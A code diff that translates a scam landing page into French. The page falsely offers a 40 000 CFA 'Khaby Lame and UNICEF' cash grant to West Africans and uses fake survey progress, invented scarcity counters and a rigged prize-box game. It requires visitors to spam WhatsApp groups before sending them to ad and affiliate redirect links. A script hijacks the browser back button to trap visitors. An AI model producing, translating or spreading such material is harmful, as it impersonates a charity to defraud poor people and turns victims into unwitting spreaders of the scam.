@@ -291,41 +291,43 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Félicitations ! Vos réponses ont été enregistrées</h2>
  
 <p class="paragraph">
-Now you have a chance to win 40 000 CFA Khaby Lame and UNICEF Community Support Grant cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Vous avez maintenant une chance de gagner la subvention en espèces de 40 000 CFA de Khaby Lame et de l’UNICEF<br><br>
+Vous avez 3 chances ! Nous vous souhaitons bonne chance
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Vous devez sélectionner la boîte qui contient le cadeau.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Commencer
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Bonne chance la prochaine fois</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Il vous reste (2) chances supplémentaires. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
 OK
 </button>
+
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh20WJu_3hA4IMVkxPhh55-XHB1NlWWqdD1x1uasYeuFI5H1VYxAUF3r4mEi8B-Re-jVles1Gd208jtH1P8PaS0V4Fbcpf-WaY8G0SRKVYV2WAWJMrfDv9ZcTE8V2ZftrGJ1j_ZhXuHwEp_1vwQPLjA4IpUD3Ul-Q6J7W_shcNZRsPhLij0HLdP0xJh24g/s1300/3d-stack-of-1000-cfa-franc-notes-isolated-on-white-background-2HK8EE9.jpg" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Félicitations ! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> 40 000 CFA cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Votre récompense est : <b> 40 000 CFA en espèces</b><br>Suivez les instructions sur la page suivante pour réclamer votre récompense ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
-Ok
+OK
 </button>
+
 </vue-modal>
   
 <div class="left">
@@ -337,12 +339,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhURXERHlJDtfhn6qHF4Hkf087OsPzVF-wJxZWfXwvhLw8u9_ytEOF5rYjOKLfll-Yx6WLQw9WssJzUaFjVJTjc3Jr5NiHiYrIF8WcoDS6eiCl_iAX3bIIvXIRtoLd9fEaH56uq1PMs5eeHnNufL_3WWH8wrXWFt2-b1v8Yqb4EJ8eDQdb38vQwk4RDy4c/s1536/khabfrenunic.jpg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Bonjour !
 </h1>
   <p class="paragraph">
-Welcome to <b>40 000 CFA Khaby Lame and UNICEF Community Support Grant For West Africa Countries in Need of Help </b>, Accept this EMPOWERMENT Opportunity to invest in your Food, business and education.
+Bienvenue à <b>la Subvention d’Appui Communautaire de 40 000 CFA de Khaby Lame et de l’UNICEF pour les pays d’Afrique de l’Ouest ayant besoin d’aide </b>, Acceptez cette opportunité d’AUTONOMISATION pour investir dans votre alimentation, votre activité et votre éducation.
 <br>
-Answer the questions below to claim <b>40 000 CFA Cash Prize</b>
+Répondez aux questions ci-dessous pour réclamer le <b>prix en espèces de 40 000 CFA</b>
 </p>
   <br>
   
@@ -353,62 +355,63 @@ Answer the questions below to claim <b>40 000 CFA Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Veuillez patienter un instant...",
+              "Veuillez patienter un instant...",
+              "Veuillez patienter un instant..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Vous avez répondu à 4/4 des questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+Vos réponses sont en cours de traitement
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+Il reste encore des récompenses disponibles !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+Recherche des cadeaux.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (389) gifts remain!
+Il ne reste que (389) cadeaux !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Vérification du stock en cours
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "How do you plan to use the grant funds?",
-              answers: [ { text: "Business" }, { text: "Shelter" }, { text: "Education" } ]
+              title: "Comment comptez-vous utiliser les fonds de la subvention ?",
+              answers: [ { text: "Activité" }, { text: "Logement" }, { text: "Éducation" } ]
             },
                                                               {
-              title: "Are you a Bank Account?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Avez-vous un compte bancaire ?",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
                
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Choisissez votre genre ?",
+              answers: [ { text: "Homme" }, { text: "Femme" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20 years" }, { text: "21 - 25 years" }, { text: "26 - 30 years" }, { text: "30 years Above" } ]
+              title: "Sélectionnez votre tranche d’âge ?",
+              answers: [ { text: "18 - 20 ans" }, { text: "21 - 25 ans" }, { text: "26 - 30 ans" }, { text: "Plus de 30 ans" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
+
 
        <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtjH80o-34PrecWPay2dCkTZ9oB73g6fEzqZe_obDN7Y2ji1hx2qQ2X0nAXM3TExIIjpKnto4jvrk4Hv5cQTgafopS4N-H8BQbDovGLug5xnGu9cttNF7B86MCpyhgKRp2ZF4lyxD3Ew0Nj9mgZ2944tdxYb6e_sMHmuwqYCb8vO87t8TjrofrZ7I9Nq4/s675/cskhaby.jpg" style="width:100%;" />
   </div>
@@ -417,20 +420,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations ! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhURXERHlJDtfhn6qHF4Hkf087OsPzVF-wJxZWfXwvhLw8u9_ytEOF5rYjOKLfll-Yx6WLQw9WssJzUaFjVJTjc3Jr5NiHiYrIF8WcoDS6eiCl_iAX3bIIvXIRtoLd9fEaH56uq1PMs5eeHnNufL_3WWH8wrXWFt2-b1v8Yqb4EJ8eDQdb38vQwk4RDy4c/s1536/khabfrenunic.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>40 000 CFA</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Votre récompense est : <b>40 000 CFA</b> <br>Suivez les instructions ci-dessous pour réclamer votre récompense !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1. Partagez avec 5 groupes / 15 amis sur "Whatsapp" (cliquez sur l’icône "Whatsapp" ci-dessous)</p><p class="rules">2. Cliquez sur "Continuer" et réclamez votre récompense.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+  <h4 class="textlastup">Partagez jusqu’à ce que la barre bleue soit pleine !</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -441,8 +444,9 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                                Continuer
                             </div>
+
    
   </div></div>
   <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtjH80o-34PrecWPay2dCkTZ9oB73g6fEzqZe_obDN7Y2ji1hx2qQ2X0nAXM3TExIIjpKnto4jvrk4Hv5cQTgafopS4N-H8BQbDovGLug5xnGu9cttNF7B86MCpyhgKRp2ZF4lyxD3Ew0Nj9mgZ2944tdxYb6e_sMHmuwqYCb8vO87t8TjrofrZ7I9Nq4/s675/cskhaby.jpg" style="width:100%;" />
@@ -454,35 +458,34 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations ! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://static.vecteezy.com/system/resources/previews/028/203/619/non_2x/3d-rendering-of-stacks-of-West-african-rand-notes-bundles-of-West-african-currency-notes-isolated-on-transparent-background-png.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>40 000 CFA cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Votre récompense est : <b>40 000 CFA en espèces.</b> <br>Suivez les instructions ci-dessous pour réclamer votre récompense !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM 40 000 CFA</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">RÉCLAMER 40 000 CFA</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">CHOISIR LE TYPE DE COMPTE</div><br/> <br/>
 
 	     <a  onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">ÉPARGNE</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">COURANT</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw 40 000 CFA</div> 
+            <div class="share_main_bt" id="offers">Retirer 40 000 CFA</div> 
       <br>
-          
-       
+
  
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtjH80o-34PrecWPay2dCkTZ9oB73g6fEzqZe_obDN7Y2ji1hx2qQ2X0nAXM3TExIIjpKnto4jvrk4Hv5cQTgafopS4N-H8BQbDovGLug5xnGu9cttNF7B86MCpyhgKRp2ZF4lyxD3Ew0Nj9mgZ2944tdxYb6e_sMHmuwqYCb8vO87t8TjrofrZ7I9Nq4/s675/cskhaby.jpg" style="width:100%;" /><br/>
     
@@ -519,23 +522,24 @@ function go() {
 <script src="https://code.jquery.com/jquery-latest.min.js"></script>
 
 
-  <script>
+ <script>
         var text1 = "ytime" ,
-            text2 = " مكتبة جرير تقدم ",
-            text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            text2 = " Jarir Librairie présente ",
+            text3 = " Dépêchez-vous et obtenez votre bon avant épuisement ici : ",
+            error = "Une erreur s’est produite !\nLes publications ne comptent pas. Vous avez peut-être partagé avec le même ami ou groupe plus d’une fois, veuillez repartager.",
             cpa = "https://luglawhaulsano.net/4/8631702",
             cpa1 = "https://luglawhaulsano.net/4/8631702",
             saved = "coke2",
             share = "whatsapp://send?text=" + text1 ;
     </script>
 
+
 <script>
   var tiaoban = [
-    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html "
-    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html "
-    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html "
-    "*40 000 CFA Community Support Grant 2026:*%0A%0ADon't miss this 40 000 CFA CASH GRANT By Khaby Lame Foundation supported by UNICEF Community Support Grant Program 2026 for All West African citizens %0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 40 000 CFA Empowerment Funds instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html ",
+    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html ",
+    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html ",
+    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html ",
+    "*Subvention d’Appui Communautaire 40 000 CFA 2026:*%0A%0ANe manquez pas cette SUBVENTION EN ESPÈCES de 40 000 CFA offerte par la Fondation Khaby Lame avec le soutien du Programme de Subvention d’Appui Communautaire de l’UNICEF 2026 pour tous les citoyens d’Afrique de l’Ouest %0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez instantanément aujourd’hui les fonds d’autonomisation de 40 000 CFA.%0A je viens d’obtenir le mien%0A%0ACliquez ici👇%0A https://rward.info/40000CFA-Khaby-UNICEF.html ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -617,9 +621,9 @@ $("#offerss").click(function () {
 });
    function tipn(){
    Swal.fire({
-  icon: 'error',
-  title: 'Unfortunately...',
-  text: 'To Receive Your Cash Grant, You have to share with friends about our event. Share until the blue bar is full!',
+  icon: 'erreur',
+  title: 'Malheureusement...',
+  text: 'Pour recevoir votre subvention, vous devez parler de notre événement à vos amis. Partagez jusqu à ce que la barre bleue soit pleine !',
   
 });
    }
@@ -642,4 +646,4 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 
 
-      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
+      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Partagez au maximum pour recevoir un cadeau.. ');		}}		catch (o){}}();</script>
